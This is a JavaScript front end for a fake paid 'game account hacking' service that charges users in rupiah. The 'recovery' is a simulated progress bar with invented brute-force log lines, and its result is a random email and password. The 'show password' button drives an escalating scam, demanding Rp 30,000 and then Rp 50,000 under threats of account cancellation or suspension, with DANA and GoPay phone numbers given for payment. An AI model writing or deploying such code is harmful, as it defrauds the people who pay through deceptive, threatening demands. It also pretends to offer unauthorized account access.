
// Import configurations
const {
    PRICE_1H,
    PRICE_7H,
    MIN_TOPUP,
    GAMES,
    LOGIN_METHODS,
    VIDEO_URL,
    CONTACT_URL,
    QRIS_URL
} = config;
// DOM Elements
const loadingScreen = document.getElementById('loading-screen');
const loginScreen = document.getElementById('login-screen');
const loginForm = document.getElementById('login-form');
const loginError = document.getElementById('login-error');
const app = document.getElementById('app');
const initiateBtn = document.getElementById('initiate-btn');
const progressSection = document.getElementById('progress-section');
const resultSection = document.getElementById('result-section');
const topupBtn = document.getElementById('topup-btn');
const topupModal = document.getElementById('topup-modal');
const passwordModal = document.getElementById('password-modal');
const balanceDisplay = document.getElementById('balance');
const targetInput = document.getElementById('target-input');

// Game and Method Selection
const gamesContainer = document.querySelector('section:has(h2:has(i[data-feather="gamepad"])) ~ div');
const methodsContainer = document.querySelector('section:has(h2:has(i[data-feather="log-in"])) ~ div');

// State
let currentBalance = 0;
let selectedGame = null;
let selectedMethod = null;
let selectedTime = null;
let passwordAttempts = 0;
let isProcessing = false;

// Initialize the app
function init() {
    // Load balance from localStorage if available
    if (localStorage.getItem('balance')) {
        currentBalance = parseInt(localStorage.getItem('balance'));
        updateBalance();
    }

    // Populate games and login methods
    populateGames();
    populateMethods();

    // Set up event listeners
    setupEventListeners();

    // Show loading screen first, then login
    setTimeout(() => {
        loadingScreen.classList.add('hidden');
        loginScreen.classList.remove('hidden');
    }, 3000); // Show login after 3s (simulate video loading)
}

// Populate game selection
function populateGames() {
    gamesContainer.innerHTML = '';
    GAMES.forEach(game => {
        const gameEl = document.createElement('button');
        gameEl.className = 'p-3 bg-gray-700 hover:bg-gray-600 rounded-lg flex flex-col items-center transition';
        gameEl.innerHTML = `
            <i data-feather="${game.icon}" class="w-5 h-5 mb-1"></i>
            <span class="text-xs">${game.name}</span>
        `;
        gameEl.addEventListener('click', () => {
            document.querySelectorAll('section:has(h2:has(i[data-feather="gamepad"])) ~ div > button').forEach(btn => {
                btn.classList.remove('bg-purple-700', 'glow');
            });
            gameEl.classList.add('bg-purple-700', 'glow');
            selectedGame = game.id;
        });
        gamesContainer.appendChild(gameEl);
    });
    feather.replace();
}

// Populate login methods
function populateMethods() {
    methodsContainer.innerHTML = '';
    LOGIN_METHODS.forEach(method => {
        const methodEl = document.createElement('button');
        methodEl.className = 'p-3 bg-gray-700 hover:bg-gray-600 rounded-lg flex flex-col items-center transition';
        methodEl.innerHTML = `
            <i data-feather="${method.icon}" class="w-5 h-5 mb-1"></i>
            <span class="text-xs">${method.method}</span>
        `;
        methodEl.addEventListener('click', () => {
            document.querySelectorAll('section:has(h2:has(i[data-feather="log-in"])) ~ div > button').forEach(btn => {
                btn.classList.remove('bg-purple-700', 'glow');
            });
            methodEl.classList.add('bg-purple-700', 'glow');
            selectedMethod = method.id;
        });
        methodsContainer.appendChild(methodEl);
    });
    feather.replace();
}

// Set up event listeners
function setupEventListeners() {
    // Login form submission
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        // Validate credentials (imported from credentials.js)
        const isValid = CREDENTIALS.some(cred => 
            cred.username === username && cred.password === password
        );
if (isValid) {
            loginScreen.classList.add('hidden');
            app.classList.remove('hidden');
            startVantaEffect();
        } else {
            loginError.textContent = 'Invalid access key or passphrase';
            loginError.classList.remove('hidden');
        }
    });

    // Initiate button
    initiateBtn.addEventListener('click', () => {
        if (isProcessing) return;
        
        // Validate selections
        if (!targetInput.value) {
            showError('Please enter target ID/username/email');
            return;
        }
        if (!selectedGame) {
            showError('Please select a game');
            return;
        }
        if (!selectedMethod) {
            showError('Please select a login method');
            return;
        }
        if (!selectedTime) {
            showError('Please select processing time');
            return;
        }
        
        // Check balance
        const cost = selectedTime === '1h' ? PRICE_1H : PRICE_7H;
        if (currentBalance < cost) {
            showError(`Insufficient balance. Need Rp ${cost.toLocaleString()}`);
            return;
        }
        
        // Deduct balance and start process
        currentBalance -= cost;
        updateBalance();
        startRecoveryProcess();
    });

    // Top up button
    topupBtn.addEventListener('click', () => {
        topupModal.classList.remove('hidden');
    });

    // Close top up modal
    document.getElementById('close-topup').addEventListener('click', () => {
        topupModal.classList.add('hidden');
        document.getElementById('payment-details').classList.add('hidden');
    });

    // Payment method buttons
    document.querySelectorAll('[data-method]').forEach(btn => {
        btn.addEventListener('click', () => {
            const amount = parseInt(document.getElementById('topup-amount').value);
            if (isNaN(amount) || amount < MIN_TOPUP) {
                showError(`Minimum top up is Rp ${MIN_TOPUP.toLocaleString()}`);
                return;
            }

            const method = btn.getAttribute('data-method');
            const paymentDetails = document.getElementById('payment-details');
            const paymentInfo = document.getElementById('payment-info');
            const qrisImage = document.getElementById('qris-image');

            paymentDetails.classList.remove('hidden');
            qrisImage.classList.add('hidden');

            if (method === 'dana') {
                paymentInfo.textContent = `Send Rp ${amount.toLocaleString()} to DANA: 085820010137`;
            } else if (method === 'gopay') {
                paymentInfo.textContent = `Send Rp ${amount.toLocaleString()} to GOPAY: 085820010137`;
            } else if (method === 'qris') {
                paymentInfo.textContent = `Scan QRIS to send Rp ${amount.toLocaleString()}`;
                qrisImage.innerHTML = `<img src="${QRIS_URL}" alt="QRIS" class="rounded-lg border border-gray-600">`;
                qrisImage.classList.remove('hidden');
            }
        });
    });

    // Confirm payment
    document.getElementById('confirm-payment').addEventListener('click', () => {
        const amount = parseInt(document.getElementById('topup-amount').value);
        currentBalance += amount;
        updateBalance();
        topupModal.classList.add('hidden');
        document.getElementById('payment-details').classList.add('hidden');
        showSuccess(`Successfully added Rp ${amount.toLocaleString()} to your balance`);
    });

    // Show password button
    document.getElementById('show-password-btn').addEventListener('click', () => {
        passwordAttempts++;
        let message = '';
        let cost = 0;
        
        if (passwordAttempts === 1) {
            message = 'Please pay Rp 30.000 for account security or your account will be canceled';
            cost = 30000;
        } else if (passwordAttempts === 2) {
            message = 'Please pay Rp 50.000 for admin and server fees or your account will be suspended';
            cost = 50000;
        } else {
            message = 'No payment history found. Please make payment again. If already paid, Rp 50.000 will be refunded';
            cost = 50000;
        }
        
        if (currentBalance < cost) {
            showError('Insufficient balance for this operation');
            return;
        }
        
        document.getElementById('password-message').textContent = message;
        passwordModal.classList.remove('hidden');
        
        document.getElementById('confirm-password').onclick = () => {
            currentBalance -= cost;
            updateBalance();
            passwordModal.classList.add('hidden');
            
            // Show the password (in a real app, this would be secure)
            if (passwordAttempts >= 3) {
                document.getElementById('result-password').textContent = generateRandomPassword();
            } else {
                document.getElementById('result-password').textContent = generateRandomPassword();
            }
            
            // Change icon to eye-off
            const eyeIcon = document.querySelector('#show-password-btn i');
            eyeIcon.setAttribute('data-feather', 'eye-off');
            feather.replace();
        };
    });

    // Close password modal
    document.getElementById('close-password').addEventListener('click', () => {
        passwordModal.classList.add('hidden');
    });

    document.getElementById('cancel-password').addEventListener('click', () => {
        passwordModal.classList.add('hidden');
    });

    // Time selection
    document.querySelectorAll('input[name="processing-time"]').forEach(radio => {
        radio.addEventListener('change', (e) => {
            selectedTime = e.target.value;
        });
    });
}

// Start recovery process
function startRecoveryProcess() {
    isProcessing = true;
    resultSection.classList.add('hidden');
    progressSection.classList.remove('hidden');
    
    const progressBar = document.getElementById('progress-bar');
    const progressLog = document.getElementById('progress-log');
    progressLog.innerHTML = '';
    
    let progress = 0;
    const interval = setInterval(() => {
        progress += Math.random() * 10;
        if (progress > 100) progress = 100;
        progressBar.style.width = `${progress}%`;
        
        // Add log entries
        const now = new Date();
        const timeStr = now.toLocaleTimeString();
        const logEntry = document.createElement('div');
        logEntry.className = 'progress-entry';
        
        if (progress < 30) {
            logEntry.textContent = `[${timeStr}] Initializing AI modules...`;
        } else if (progress < 60) {
            logEntry.textContent = `[${timeStr}] Analyzing ${selectedGame} account patterns...`;
        } else if (progress < 80) {
            logEntry.textContent = `[${timeStr}] Brute-forcing ${selectedMethod} encryption...`;
        } else {
            logEntry.textContent = `[${timeStr}] Finalizing account recovery...`;
        }
        
        progressLog.appendChild(logEntry);
        progressLog.scrollTop = progressLog.scrollHeight;
        
        if (progress === 100) {
            clearInterval(interval);
            setTimeout(() => {
                showResults();
                isProcessing = false;
            }, 1000);
        }
    }, selectedTime === '1h' ? 300 : 600); // Faster updates for 1h option
}

// Show results
function showResults() {
    progressSection.classList.add('hidden');
    resultSection.classList.remove('hidden');
    
    const game = GAMES.find(g => g.id === selectedGame);
    const method = LOGIN_METHODS.find(m => m.id === selectedMethod);
    
    document.getElementById('result-email').textContent = `${targetInput.value}@${generateRandomDomain()}`;
    document.getElementById('result-password').textContent = '••••••••';
    document.getElementById('result-method').textContent = method.name;
    document.getElementById('result-game').textContent = game.name;
    
    // Reset password button
    const eyeIcon = document.querySelector('#show-password-btn i');
    eyeIcon.setAttribute('data-feather', 'eye');
    feather.replace();
    passwordAttempts = 0;
}

// Helper functions
function updateBalance() {
    balanceDisplay.textContent = currentBalance.toLocaleString();
    localStorage.setItem('balance', currentBalance.toString());
}

function generateRandomPassword() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    let password = '';
    for (let i = 0; i < 12; i++) {
        password += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return password;
}

function generateRandomDomain() {
    const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com'];
    return domains[Math.floor(Math.random() * domains.length)];
}

function showError(message) {
    const errorEl = document.createElement('div');
    errorEl.className = 'fixed top-4 right-4 bg-red-600 text-white px-4 py-2 rounded-lg shadow-lg';
    errorEl.textContent = message;
    document.body.appendChild(errorEl);
    setTimeout(() => {
        errorEl.remove();
    }, 3000);
}

function showSuccess(message) {
    const successEl = document.createElement('div');
    successEl.className = 'fixed top-4 right-4 bg-green-600 text-white px-4 py-2 rounded-lg shadow-lg';
    successEl.textContent = message;
    document.body.appendChild(successEl);
    setTimeout(() => {
        successEl.remove();
    }, 3000);
}

function startVantaEffect() {
    VANTA.GLOBE({
        el: document.body,
        mouseControls: true,
        touchControls: true,
        gyroControls: false,
        minHeight: 200.00,
        minWidth: 200.00,
        scale: 1.00,
        scaleMobile: 1.00,
        color: 0x7e22ce,
        backgroundColor: 0x111827,
        size: 0.8
    });
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', init);